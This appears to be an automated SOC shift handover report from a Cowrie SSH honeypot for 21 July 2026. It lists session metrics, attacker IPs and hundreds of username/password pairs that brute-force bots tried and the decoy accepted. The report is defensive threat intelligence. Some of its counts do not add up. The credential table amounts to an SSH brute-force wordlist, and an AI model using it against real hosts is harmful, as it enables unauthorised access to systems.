# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-21 |
| **Generated At** | 2026-07-21T06:33:52Z |
| **Shift Time** | 06:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **526** |
| Confirmed Threats | **503** |
| False Positives Filtered | **23** (4.4%) |
| Unique Attacker IPs | **114** |
| Countries of Origin | **33** |
| High Severity Cases | **344** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **182** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **370** |
| Unique Credential Pairs | **317** |
| Unique Usernames | **233** |
| Unique Passwords | **232** |
| Successful Auth Pairs | **354** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `admin` | 30 |
| `unknown` | 8 |
| `centos` | 7 |
| `mysql` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 10 |
| `support` | 5 |
| `administrator` | 5 |
| `1qaz2wsx` | 5 |
| `00000` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 7 |
| `unknown` | `00000` | 5 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 4 |
| `root` | `2222222` | 4 |
| `admin` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `unknown` | `8888888` | `223.107.146.186` | 2026-07-21T02:57:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.211.220` | 2026-07-21T02:58:24 |
| `*1` | `$4` | `35.205.211.220` | 2026-07-21T02:58:33 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1459` | `35.205.211.220` | 2026-07-21T02:58:35 |
| `root` | `!root` | `92.118.39.14` | 2026-07-21T03:07:08 |
| `store` | `store` | `171.244.37.97` | 2026-07-21T03:07:08 |
| `345gs5662d34` | `345gs5662d34` | `171.244.37.97` | 2026-07-21T03:07:12 |
| `store` | `3245gs5662d34` | `171.244.37.97` | 2026-07-21T03:07:14 |
| `postgres` | `159753` | `196.189.126.10` | 2026-07-21T03:07:58 |
| `postgres` | `159753` | `185.255.212.178` | 2026-07-21T03:08:05 |
| `root` | `111111` | `92.118.39.14` | 2026-07-21T03:09:16 |
| `root` | `123123` | `92.118.39.14` | 2026-07-21T03:11:27 |
| `root` | `2222222` | `62.122.195.14` | 2026-07-21T03:11:37 |
| `debian` | `debian2005` | `203.123.219.137` | 2026-07-21T03:13:02 |
| `root` | `1234` | `92.118.39.14` | 2026-07-21T03:13:35 |
| `root` | `2222222` | `122.170.111.140` | 2026-07-21T03:14:59 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-21T03:15:01 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-21T03:15:01 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-21T03:15:10 |
| `root` | `2222222` | `120.224.15.67` | 2026-07-21T03:15:10 |
| `root` | `2222222` | `10.0.0.73` | 2026-07-21T03:15:24 |
| `root` | `12345` | `92.118.39.14` | 2026-07-21T03:15:43 |
| `root` | `12345678` | `92.118.39.14` | 2026-07-21T03:19:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.207.34` | 2026-07-21T03:20:07 |
| `*1` | `$4` | `34.78.207.34` | 2026-07-21T03:20:21 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2781` | `34.78.207.34` | 2026-07-21T03:20:23 |
| `root` | `123456789` | `92.118.39.14` | 2026-07-21T03:22:00 |
| `support` | `support` | `176.53.159.196` | 2026-07-21T03:24:01 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-07-21T03:24:06 |
| `unknown` | `6` | `190.223.36.108` | 2026-07-21T03:25:03 |
| `unknown` | `6` | `24.187.213.29` | 2026-07-21T03:25:14 |
| `support` | `support` | `10.0.0.73` | 2026-07-21T03:25:18 |
| `root` | `Password1` | `92.118.39.14` | 2026-07-21T03:26:14 |
| `root` | `Root123` | `92.118.39.14` | 2026-07-21T03:28:24 |
| `root` | `admin` | `92.118.39.14` | 2026-07-21T03:30:33 |
| `root` | `admin123` | `92.118.39.14` | 2026-07-21T03:32:40 |
| `centos` | `administrator` | `189.56.0.19` | 2026-07-21T03:32:53 |
| `centos` | `administrator` | `117.252.93.114` | 2026-07-21T03:33:02 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-21T03:33:39 |
| `root` | `P@55word` | `10.0.0.73` | 2026-07-21T03:34:37 |
| `root` | `alpine` | `92.118.39.14` | 2026-07-21T03:34:50 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-21T03:34:59 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-21T03:35:36 |
| `root` | `P@55word` | `185.242.3.195` | 2026-07-21T03:35:59 |
| `centos` | `administrator` | `49.124.150.247` | 2026-07-21T03:36:21 |
| `user` | `3` | `196.188.187.85` | 2026-07-21T03:36:33 |
| `root` | `changeme` | `92.118.39.14` | 2026-07-21T03:37:03 |
| `sgp` | `sgp` | `182.13.96.129` | 2026-07-21T03:37:58 |
| `345gs5662d34` | `345gs5662d34` | `182.13.96.129` | 2026-07-21T03:38:02 |
| `sgp` | `3245gs5662d34` | `182.13.96.129` | 2026-07-21T03:38:04 |
| `library` | `library` | `103.190.7.203` | 2026-07-21T03:38:37 |
| `345gs5662d34` | `345gs5662d34` | `103.190.7.203` | 2026-07-21T03:38:41 |
| `library` | `3245gs5662d34` | `103.190.7.203` | 2026-07-21T03:38:42 |
| `root` | `default` | `92.118.39.14` | 2026-07-21T03:39:14 |
| `test` | `test2009` | `103.83.23.169` | 2026-07-21T03:39:24 |
| `test` | `test2009` | `65.20.163.103` | 2026-07-21T03:39:32 |
| `user` | `3` | `10.0.0.73` | 2026-07-21T03:40:23 |
| `root` | `letmein` | `92.118.39.14` | 2026-07-21T03:41:27 |
| `francis` | `123` | `185.242.3.195` | 2026-07-21T03:43:18 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-07-21T03:43:34 |
| `root` | `password` | `92.118.39.14` | 2026-07-21T03:45:37 |
| `root` | `qwerty` | `92.118.39.14` | 2026-07-21T03:47:43 |
| `mysql` | `1qaz2wsx` | `58.57.154.146` | 2026-07-21T03:49:47 |
| `mysql` | `1qaz2wsx` | `178.178.194.136` | 2026-07-21T03:49:54 |
| `root` | `r00t` | `92.118.39.14` | 2026-07-21T03:50:07 |
| `mysql` | `1qaz2wsx` | `10.0.0.73` | 2026-07-21T03:50:10 |
| `nexus` | `QWEqwe123` | `91.92.42.36` | 2026-07-21T03:53:37 |
| `soporte` | `root12345` | `91.92.42.36` | 2026-07-21T03:53:43 |
| `Lucja` | `clawdbot` | `91.92.42.36` | 2026-07-21T03:53:48 |
| `a1` | `app` | `91.92.42.36` | 2026-07-21T03:53:52 |
| `ashishr` | `ec2-user` | `91.92.42.36` | 2026-07-21T03:53:57 |
| `ben_kenobi` | `qwerty` | `91.92.42.36` | 2026-07-21T03:54:02 |
| `tim` | `ivan` | `91.92.42.36` | 2026-07-21T03:54:08 |
| `root` | `root123` | `92.118.39.14` | 2026-07-21T03:54:08 |
| `us11` | `root@1234` | `91.92.42.36` | 2026-07-21T03:54:13 |
| `neos` | `1234567890` | `91.92.42.36` | 2026-07-21T03:54:18 |
| `user03` | `12345` | `91.92.42.36` | 2026-07-21T03:54:22 |
| `frappe` | `root@1234` | `91.92.42.36` | 2026-07-21T03:54:27 |
| `arshia` | `qwe123!@` | `91.92.42.36` | 2026-07-21T03:54:33 |
| `mirarus` | `administrator` | `91.92.42.36` | 2026-07-21T03:54:38 |
| `samanali222` | `reza` | `91.92.42.36` | 2026-07-21T03:54:42 |
| `5930` | `sadmin` | `91.92.42.36` | 2026-07-21T03:54:47 |
| `a1naomi` | `fastuser` | `91.92.42.36` | 2026-07-21T03:54:52 |
| `theitman` | `cw` | `91.92.42.36` | 2026-07-21T03:54:58 |
| `SJ10` | `uftp` | `91.92.42.36` | 2026-07-21T03:55:02 |
| `zhanghong` | `hadoop` | `91.92.42.36` | 2026-07-21T03:55:07 |
| `labuser` | `guest123` | `91.92.42.36` | 2026-07-21T03:55:13 |
| `xiongyinxiang` | `Changeme_123` | `91.92.42.36` | 2026-07-21T03:55:18 |
| `svn` | `odoo14` | `91.92.42.36` | 2026-07-21T03:55:22 |
| `us23` | `Welcome@123` | `91.92.42.36` | 2026-07-21T03:55:27 |
| `restore_user` | `backup` | `91.92.42.36` | 2026-07-21T03:55:32 |
| `pujie` | `dmdba` | `91.92.42.36` | 2026-07-21T03:55:37 |
| `vijay` | `wso2` | `91.92.42.36` | 2026-07-21T03:55:42 |
| `us5` | `ZAQ!2wsx` | `91.92.42.36` | 2026-07-21T03:55:47 |
| `zahra` | `test1234` | `91.92.42.36` | 2026-07-21T03:55:52 |
| `alpine` | `sadmin` | `91.92.42.36` | 2026-07-21T03:55:57 |
| `s10franch` | `qwe123456` | `91.92.42.36` | 2026-07-21T03:56:03 |
| `ldapadmin` | `P@ssword` | `91.92.42.36` | 2026-07-21T03:56:07 |
| `root` | `root@123` | `92.118.39.14` | 2026-07-21T03:56:09 |
| `perforce` | `root12345` | `91.92.42.36` | 2026-07-21T03:56:13 |
| `mohamad` | `rajvir123` | `91.92.42.36` | 2026-07-21T03:56:18 |
| `armin` | `developer` | `91.92.42.36` | 2026-07-21T03:56:23 |
| `upmpdcli` | `prefect` | `91.92.42.36` | 2026-07-21T03:56:28 |
| `c_three_pio` | `crafty` | `91.92.42.36` | 2026-07-21T03:56:34 |
| `upmpdcli` | `newuser` | `91.92.42.36` | 2026-07-21T03:56:39 |
| `s8josiane` | `guest` | `91.92.42.36` | 2026-07-21T03:56:44 |
| `raaj` | `abc123456` | `91.92.42.36` | 2026-07-21T03:56:49 |
| `compras2` | `ftp` | `91.92.42.36` | 2026-07-21T03:56:54 |
| `tim` | `drcomadmin123` | `91.92.42.36` | 2026-07-21T03:56:59 |
| `ul` | `trader` | `91.92.42.36` | 2026-07-21T03:57:04 |
| `worker` | `frappe123` | `91.92.42.36` | 2026-07-21T03:57:09 |
| `us70` | `webuser` | `91.92.42.36` | 2026-07-21T03:57:15 |
| `5928` | `oracle` | `91.92.42.36` | 2026-07-21T03:57:20 |
| `screenshot` | `oracle` | `91.92.42.36` | 2026-07-21T03:57:25 |
| `root` | `q1w2e3r4t5` | `91.92.42.36` | 2026-07-21T03:57:30 |
| `user14` | `linux` | `91.92.42.36` | 2026-07-21T03:57:35 |
| `vnc` | `bob` | `91.92.42.36` | 2026-07-21T03:57:40 |
| `frances` | `passwd` | `91.92.42.36` | 2026-07-21T03:57:45 |
| `frances` | `root@123` | `91.92.42.36` | 2026-07-21T03:57:50 |
| `hadoop` | `factorio` | `91.92.42.36` | 2026-07-21T03:57:55 |
| `node` | `sadmin` | `91.92.42.36` | 2026-07-21T03:58:00 |
| `brute` | `localhost` | `91.92.42.36` | 2026-07-21T03:58:05 |
| `root` | `rootme` | `92.118.39.14` | 2026-07-21T03:58:06 |
| `rramesh` | `labuser` | `91.92.42.36` | 2026-07-21T03:58:11 |
| `superset` | `odoo` | `91.92.42.36` | 2026-07-21T03:58:15 |
| `pey12` | `dev123456` | `91.92.42.36` | 2026-07-21T03:58:20 |
| `openclaw` | `customer` | `91.92.42.36` | 2026-07-21T03:58:25 |
| `russo` | `sftpuser` | `91.92.42.36` | 2026-07-21T03:58:30 |
| `bob` | `nutanix/4u` | `91.92.42.36` | 2026-07-21T03:58:35 |
| `unl1` | `asterisk` | `91.92.42.36` | 2026-07-21T03:58:40 |
| `sinusbot` | `admin2` | `91.92.42.36` | 2026-07-21T03:58:45 |
| `a1michael` | `ubuntu` | `91.92.42.36` | 2026-07-21T03:58:50 |
| `shahsavandi` | `hduser` | `91.92.42.36` | 2026-07-21T03:58:55 |
| `hwadmin` | `pass` | `91.92.42.36` | 2026-07-21T03:59:00 |
| `li` | `home` | `91.92.42.36` | 2026-07-21T03:59:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.118.104` | 2026-07-21T03:59:09 |
| `us7` | `neptune` | `91.92.42.36` | 2026-07-21T03:59:10 |
| `sanam` | `centos` | `91.92.42.36` | 2026-07-21T03:59:14 |
| `lbg` | `claude` | `91.92.42.36` | 2026-07-21T03:59:19 |
| `*1` | `$4` | `34.78.118.104` | 2026-07-21T03:59:23 |
| `sysupdate` | `openclaw` | `91.92.42.36` | 2026-07-21T03:59:24 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7908` | `34.78.118.104` | 2026-07-21T03:59:26 |
| `ftpuser1` | `postgres123` | `91.92.42.36` | 2026-07-21T03:59:29 |
| `bobrkurwa7` | `odoo18` | `91.92.42.36` | 2026-07-21T03:59:33 |
| `5925` | `ivan` | `91.92.42.36` | 2026-07-21T03:59:39 |
| `jenkins` | `Welcome@123` | `91.92.42.36` | 2026-07-21T03:59:44 |
| `wuxihuarun` | `zaq12wsx` | `91.92.42.36` | 2026-07-21T03:59:48 |
| `ggonzalez` | `q1w2e3r4` | `91.92.42.36` | 2026-07-21T03:59:53 |
| `isabakir` | `mysql` | `91.92.42.36` | 2026-07-21T03:59:58 |
| `joel` | `ZAQ!2wsx` | `91.92.42.36` | 2026-07-21T04:00:03 |
| `root` | `system` | `92.118.39.14` | 2026-07-21T04:00:04 |
| `smtpuser` | `root@1234` | `91.92.42.36` | 2026-07-21T04:00:08 |
| `ispapps` | `elasticsearch@1234` | `91.92.42.36` | 2026-07-21T04:00:13 |
| `mitmproxyuser` | `root` | `91.92.42.36` | 2026-07-21T04:00:18 |
| `daemon` | `user` | `91.92.42.36` | 2026-07-21T04:00:23 |
| `user6` | `orca` | `91.92.42.36` | 2026-07-21T04:00:28 |
| `backup_1` | `esearch` | `91.92.42.36` | 2026-07-21T04:00:33 |
| `no-reply` | `123321` | `91.92.42.36` | 2026-07-21T04:00:38 |
| `zhaojiwei` | `sam` | `91.92.42.36` | 2026-07-21T04:00:43 |
| `test2` | `teamspeak` | `91.92.42.36` | 2026-07-21T04:00:48 |
| `wsl` | `P@ssword1` | `91.92.42.36` | 2026-07-21T04:00:53 |
| `unknown` | `00000` | `116.48.143.166` | 2026-07-21T04:00:56 |
| `panfs-1-jfletcher-svc` | `linux` | `91.92.42.36` | 2026-07-21T04:00:58 |
| `a1edem` | `111` | `91.92.42.36` | 2026-07-21T04:01:03 |
| `s8daniyal` | `bot` | `91.92.42.36` | 2026-07-21T04:01:07 |
| `rajesh` | `qwerty` | `91.92.42.36` | 2026-07-21T04:01:12 |
| `root` | `14881488` | `185.40.30.168` | 2026-07-21T04:01:15 |
| `chenweijun` | `trinity` | `91.92.42.36` | 2026-07-21T04:01:17 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.172` | 2026-07-21T04:01:17 |
| `amrita` | `sam` | `91.92.42.36` | 2026-07-21T04:01:22 |
| `kubernetes` | `p@ssw0rd` | `91.92.42.36` | 2026-07-21T04:01:27 |
| `5917` | `gary` | `91.92.42.36` | 2026-07-21T04:01:32 |
| `s7agbor` | `username` | `91.92.42.36` | 2026-07-21T04:01:37 |
| `pey2` | `1029384756` | `91.92.42.36` | 2026-07-21T04:01:41 |
| `lscpd` | `11111111` | `91.92.42.36` | 2026-07-21T04:01:46 |
| `jack` | `P@55w0rd` | `91.92.42.36` | 2026-07-21T04:01:51 |
| `me` | `fahmi` | `91.92.42.36` | 2026-07-21T04:01:56 |
| `wetdryworld` | `splunk` | `91.92.42.36` | 2026-07-21T04:02:01 |
| `root` | `toor` | `92.118.39.14` | 2026-07-21T04:02:02 |
| `huangguocheng` | `fivem` | `91.92.42.36` | 2026-07-21T04:02:06 |
| `t2` | `q1w2e3r4` | `91.92.42.36` | 2026-07-21T04:02:11 |
| `ogp_agent` | `LeitboGi0ro` | `91.92.42.36` | 2026-07-21T04:02:16 |
| `vt320` | `git` | `91.92.42.36` | 2026-07-21T04:02:20 |
| `user26` | `media` | `91.92.42.36` | 2026-07-21T04:02:25 |
| `lengcan` | `backup` | `91.92.42.36` | 2026-07-21T04:02:30 |
| `t6` | `Qq123456` | `91.92.42.36` | 2026-07-21T04:02:35 |
| `ssm-user` | `deploy` | `91.92.42.36` | 2026-07-21T04:02:39 |
| `config` | `123654` | `61.2.228.177` | 2026-07-21T04:02:40 |
| `student1` | `devops` | `91.92.42.36` | 2026-07-21T04:02:44 |
| `config` | `123654` | `146.190.215.195` | 2026-07-21T04:02:47 |
| `hrl` | `prefect` | `91.92.42.36` | 2026-07-21T04:02:49 |
| `github` | `dolphinscheduler123` | `91.92.42.36` | 2026-07-21T04:02:54 |
| `sunil` | `leonardo` | `91.92.42.36` | 2026-07-21T04:02:58 |
| `SJ02` | `ftpuser` | `91.92.42.36` | 2026-07-21T04:03:03 |
| `Ubuntu` | `test123` | `91.92.42.36` | 2026-07-21T04:03:08 |
| `.d` | `asterisk` | `91.92.42.36` | 2026-07-21T04:03:13 |
| `ayal` | `admin1` | `91.92.42.36` | 2026-07-21T04:03:17 |
| `wujian` | `oscar123` | `91.92.42.36` | 2026-07-21T04:03:22 |
| `angel` | `cw` | `91.92.42.36` | 2026-07-21T04:03:27 |
| `irc` | `12345678` | `91.92.42.36` | 2026-07-21T04:03:32 |
| `gl07` | `phuvanduc` | `91.92.42.36` | 2026-07-21T04:03:36 |
| `ops` | `mysql@1234` | `91.92.42.36` | 2026-07-21T04:03:42 |
| `info` | `frappe@123` | `91.92.42.36` | 2026-07-21T04:03:47 |
| `steam` | `test2` | `91.92.42.36` | 2026-07-21T04:03:52 |
| `fbl` | `Aa123456` | `91.92.42.36` | 2026-07-21T04:03:57 |
| `root` | `welcome` | `92.118.39.14` | 2026-07-21T04:03:58 |
| `lvjianfei` | `rdpuser` | `91.92.42.36` | 2026-07-21T04:04:02 |
| `webserv` | `huawei@123` | `91.92.42.36` | 2026-07-21T04:04:06 |
| `CG02` | `mc` | `91.92.42.36` | 2026-07-21T04:04:11 |
| `admin` | `admin` | `198.98.53.110` | 2026-07-21T04:04:12 |
| `gbezborodov` | `crafty` | `91.92.42.36` | 2026-07-21T04:04:16 |
| `priyanka` | `wang` | `91.92.42.36` | 2026-07-21T04:04:21 |
| `unknown` | `00000` | `83.239.108.218` | 2026-07-21T04:04:25 |
| `s8mike` | `Password1` | `91.92.42.36` | 2026-07-21T04:04:26 |
| `user16` | `root1234` | `91.92.42.36` | 2026-07-21T04:04:31 |
| `unknown` | `00000` | `213.130.207.177` | 2026-07-21T04:04:32 |
| `sale` | `adminuser` | `91.92.42.36` | 2026-07-21T04:04:35 |
| `sem8` | `erp` | `91.92.42.36` | 2026-07-21T04:04:40 |
| `5909` | `deploy123` | `91.92.42.36` | 2026-07-21T04:04:44 |
| `anakin_skywalker` | `Test1234` | `91.92.42.36` | 2026-07-21T04:04:49 |
| `unknown` | `00000` | `10.0.0.73` | 2026-07-21T04:04:50 |
| `s8nelson` | `packer` | `91.92.42.36` | 2026-07-21T04:04:54 |
| `zomboid` | `Aa1234567890` | `91.92.42.36` | 2026-07-21T04:04:59 |
| `wuxihuarun` | `qwe123!@` | `91.92.42.36` | 2026-07-21T04:05:04 |
| `samanali` | `!QAZ2wsx3edc` | `91.92.42.36` | 2026-07-21T04:05:09 |
| `gl02` | `a` | `91.92.42.36` | 2026-07-21T04:05:14 |
| `sftp` | `123@@@` | `91.92.42.36` | 2026-07-21T04:05:19 |
| `gl14` | `QWEqwe123` | `91.92.42.36` | 2026-07-21T04:05:24 |
| `bastionse` | `hduser` | `91.92.42.36` | 2026-07-21T04:05:29 |
| `ati` | `gitlab` | `91.92.42.36` | 2026-07-21T04:05:34 |
| `us20` | `1qazxsw2` | `91.92.42.36` | 2026-07-21T04:05:38 |
| `tester` | `postgres` | `91.92.42.36` | 2026-07-21T04:05:43 |
| `vpnuser` | `1Q2w3e4r` | `91.92.42.36` | 2026-07-21T04:05:48 |
| `docker` | `qQ123456` | `91.92.42.36` | 2026-07-21T04:05:53 |
| `me` | `1qaz@WSX` | `91.92.42.36` | 2026-07-21T04:05:58 |
| `secadmin` | `support` | `91.92.42.36` | 2026-07-21T04:06:03 |
| `root` | `pallmall` | `91.92.42.36` | 2026-07-21T04:06:07 |
| `postfix` | `12qwaszx` | `91.92.42.36` | 2026-07-21T04:06:12 |
| `admin` | `111111` | `92.118.39.14` | 2026-07-21T04:06:14 |
| `kims` | `dmdba@123` | `91.92.42.36` | 2026-07-21T04:06:17 |
| `DE` | `1111` | `91.92.42.36` | 2026-07-21T04:06:22 |
| `s8zuby` | `cursor` | `91.92.42.36` | 2026-07-21T04:06:27 |
| `us18` | `ubuntu` | `91.92.42.36` | 2026-07-21T04:06:32 |
| `module` | `david` | `91.92.42.36` | 2026-07-21T04:06:37 |
| `neptune` | `dev123456` | `91.92.42.36` | 2026-07-21T04:06:42 |
| `styx` | `gpadmin` | `91.92.42.36` | 2026-07-21T04:06:47 |
| `couchdb` | `claude123` | `91.92.42.36` | 2026-07-21T04:06:52 |
| `hosting` | `elk@123` | `91.92.42.36` | 2026-07-21T04:06:57 |
| `sysupdate` | `abc12345` | `91.92.42.36` | 2026-07-21T04:07:02 |
| `hadoop` | `ftpuser` | `91.92.42.36` | 2026-07-21T04:07:07 |
| `user0` | `developer` | `91.92.42.36` | 2026-07-21T04:07:12 |
| `luca` | `orca` | `91.92.42.36` | 2026-07-21T04:07:17 |
| `sysops` | `playground` | `91.92.42.36` | 2026-07-21T04:07:22 |
| `root` | `huawei12#$` | `91.92.42.36` | 2026-07-21T04:07:27 |
| `s9liwens` | `123321` | `91.92.42.36` | 2026-07-21T04:07:32 |
| `portal` | `fivem` | `91.92.42.36` | 2026-07-21T04:07:37 |
| `murong` | `Qwerty` | `91.92.42.36` | 2026-07-21T04:07:42 |
| `centos` | `admin@123` | `91.92.42.36` | 2026-07-21T04:07:47 |
| `a1jones` | `Huawei123` | `91.92.42.36` | 2026-07-21T04:07:53 |
| `app` | `runner` | `91.92.42.36` | 2026-07-21T04:07:58 |
| `fanjunjian` | `asd123` | `91.92.42.36` | 2026-07-21T04:08:02 |
| `vlad` | `arthur` | `91.92.42.36` | 2026-07-21T04:08:08 |
| `admin` | `123123` | `92.118.39.14` | 2026-07-21T04:08:12 |
| `tty0` | `centos` | `91.92.42.36` | 2026-07-21T04:08:12 |
| `nico` | `P@ssw0rd123` | `91.92.42.36` | 2026-07-21T04:08:17 |
| `YS01` | `wso2` | `91.92.42.36` | 2026-07-21T04:08:22 |
| `hushengjie` | `Changeme_123` | `91.92.42.36` | 2026-07-21T04:08:28 |
| `50hertz` | `admin` | `91.92.42.36` | 2026-07-21T04:08:32 |
| `italiano` | `p@ssw0rd` | `91.92.42.36` | 2026-07-21T04:08:37 |
| `gl01` | `rdpuser` | `91.92.42.36` | 2026-07-21T04:08:42 |
| `global` | `labuser` | `91.92.42.36` | 2026-07-21T04:08:47 |
| `s8nnamdi` | `11` | `91.92.42.36` | 2026-07-21T04:08:52 |
| `pujie` | `joel` | `91.92.42.36` | 2026-07-21T04:08:57 |
| `stack` | `stack` | `91.92.42.36` | 2026-07-21T04:09:02 |
| `us57` | `elastic` | `91.92.42.36` | 2026-07-21T04:09:07 |
| `ogp_server_runner` | `a123456A` | `91.92.42.36` | 2026-07-21T04:09:12 |
| `wangjunhui` | `11` | `91.92.42.36` | 2026-07-21T04:09:17 |
| `user11` | `ftpuser` | `91.92.42.36` | 2026-07-21T04:09:22 |
| `solana` | `geyser` | `91.92.42.36` | 2026-07-21T04:09:27 |
| `pufferpanel` | `vm` | `91.92.42.36` | 2026-07-21T04:09:33 |
| `kamgareyman` | `Passw0rd` | `91.92.42.36` | 2026-07-21T04:09:37 |
| `ul` | `root@123` | `91.92.42.36` | 2026-07-21T04:09:42 |
| `pey13` | `devuser` | `91.92.42.36` | 2026-07-21T04:09:47 |
| `igaldahan` | `erp` | `91.92.42.36` | 2026-07-21T04:09:53 |
| `kevin` | `Password@123` | `91.92.42.36` | 2026-07-21T04:09:58 |
| `risc_gen_pj` | `osmc` | `91.92.42.36` | 2026-07-21T04:10:03 |
| `pey20` | `1qaz2wsx` | `91.92.42.36` | 2026-07-21T04:10:08 |
| `admin` | `1234` | `92.118.39.14` | 2026-07-21T04:10:09 |
| `s10femi` | `dev123456` | `91.92.42.36` | 2026-07-21T04:10:13 |
| `lhh` | `P@ssw0rd123` | `91.92.42.36` | 2026-07-21T04:10:19 |
| `systemd` | `pi` | `91.92.42.36` | 2026-07-21T04:10:23 |
| `core` | `g` | `91.92.42.36` | 2026-07-21T04:10:28 |
| `media` | `es123456` | `91.92.42.36` | 2026-07-21T04:10:34 |
| `arvin` | `pi` | `91.92.42.36` | 2026-07-21T04:10:39 |
| `noksa` | `12345` | `91.92.42.36` | 2026-07-21T04:10:44 |
| `CG05` | `hive` | `91.92.42.36` | 2026-07-21T04:10:49 |
| `yanghao` | `elasticsearch@1234` | `91.92.42.36` | 2026-07-21T04:10:54 |
| `bbonner` | `P@55w0rd` | `91.92.42.36` | 2026-07-21T04:10:59 |
| `us63` | `nobody` | `91.92.42.36` | 2026-07-21T04:11:04 |
| `backup_1` | `tester` | `91.92.42.36` | 2026-07-21T04:11:09 |
| `julian` | `zimbra` | `91.92.42.36` | 2026-07-21T04:11:14 |
| `huangzhijun` | `aA123456` | `91.92.42.36` | 2026-07-21T04:11:19 |
| `blackcard_lo_usr` | `azureuser` | `91.92.42.36` | 2026-07-21T04:11:23 |
| `s8faiza` | `!Q2w3e4r` | `91.92.42.36` | 2026-07-21T04:11:29 |
| `a1samka` | `reza` | `91.92.42.36` | 2026-07-21T04:11:33 |
| `data_admin` | `teamspeak` | `91.92.42.36` | 2026-07-21T04:11:39 |
| `mojtaba` | `cursor` | `91.92.42.36` | 2026-07-21T04:11:43 |
| `pws127` | `kubernetes` | `91.92.42.36` | 2026-07-21T04:11:49 |
| `hpcadmin` | `changeme` | `91.92.42.36` | 2026-07-21T04:11:53 |
| `onebit` | `123123` | `91.92.42.36` | 2026-07-21T04:11:58 |
| `admin` | `12345` | `92.118.39.14` | 2026-07-21T04:12:09 |
| `admin` | `123456` | `92.118.39.14` | 2026-07-21T04:14:06 |
| `operator` | `operator2018` | `58.34.174.90` | 2026-07-21T04:14:08 |
| `operator` | `operator2018` | `66.45.144.201` | 2026-07-21T04:14:18 |
| `operator` | `operator2018` | `10.0.0.73` | 2026-07-21T04:14:35 |
| `admin` | `12345678` | `92.118.39.14` | 2026-07-21T04:16:03 |
| `admin` | `123456789` | `92.118.39.14` | 2026-07-21T04:17:59 |
| `admin` | `Admin123` | `92.118.39.14` | 2026-07-21T04:19:58 |
| `admin` | `Administrator` | `92.118.39.14` | 2026-07-21T04:22:02 |
| `admin` | `P@ssw0rd` | `92.118.39.14` | 2026-07-21T04:24:06 |
| `centos` | `toor` | `188.43.204.45` | 2026-07-21T04:25:31 |
| `centos` | `toor` | `65.20.217.64` | 2026-07-21T04:25:38 |
| `mysql` | `test` | `203.192.211.180` | 2026-07-21T04:25:46 |
| `centos` | `toor` | `10.0.0.73` | 2026-07-21T04:26:04 |
| `ubnt` | `ubnt2023` | `200.89.159.59` | 2026-07-21T04:26:06 |
| `admin` | `access` | `92.118.39.14` | 2026-07-21T04:26:12 |
| `francis` | `123` | `10.0.0.73` | 2026-07-21T04:26:22 |
| `ubnt` | `ubnt2023` | `10.0.0.73` | 2026-07-21T04:26:27 |
| `admin` | `admin` | `92.118.39.14` | 2026-07-21T04:28:12 |
| `mysql` | `test` | `182.139.39.150` | 2026-07-21T04:29:16 |
| `admin` | `admin123` | `92.118.39.14` | 2026-07-21T04:30:04 |
| `admin` | `admin@123` | `92.118.39.14` | 2026-07-21T04:31:57 |
| `admin` | `adminadmin` | `92.118.39.14` | 2026-07-21T04:33:53 |
| `root` | `godzilla` | `185.242.3.195` | 2026-07-21T04:34:55 |
| `admin` | `letmein` | `92.118.39.14` | 2026-07-21T04:35:47 |
| `admin` | `passw0rd` | `92.118.39.14` | 2026-07-21T04:37:42 |
| `blank` | `111111` | `14.99.61.248` | 2026-07-21T04:38:58 |
| `blank` | `111111` | `10.0.0.73` | 2026-07-21T04:39:19 |
| `admin` | `password` | `92.118.39.14` | 2026-07-21T04:39:40 |
| `admin` | `password1` | `92.118.39.14` | 2026-07-21T04:41:37 |
| `admin` | `qwerty` | `92.118.39.14` | 2026-07-21T04:43:34 |
| `admin` | `admin` | `148.66.142.9` | 2026-07-21T04:43:37 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-21T04:43:37 |
| `administrator` | `123456` | `92.118.39.14` | 2026-07-21T04:45:29 |
| `blank` | `blank2018` | `196.189.124.218` | 2026-07-21T04:46:22 |
| `blank` | `blank2018` | `46.101.9.55` | 2026-07-21T04:46:28 |
| `administrator` | `P@ssw0rd` | `92.118.39.14` | 2026-07-21T04:47:25 |
| `administrator` | `admin` | `92.118.39.14` | 2026-07-21T04:49:20 |
| `blank` | `blank2018` | `10.0.0.73` | 2026-07-21T04:49:46 |
| `debian` | `99` | `177.159.150.111` | 2026-07-21T04:50:18 |
| `administrator` | `administrator` | `92.118.39.14` | 2026-07-21T04:51:16 |
| `administrator` | `password` | `92.118.39.14` | 2026-07-21T04:53:16 |
| `guest` | `2` | `125.69.76.148` | 2026-07-21T04:53:57 |
| `guest` | `2` | `186.239.41.74` | 2026-07-21T04:54:10 |

---

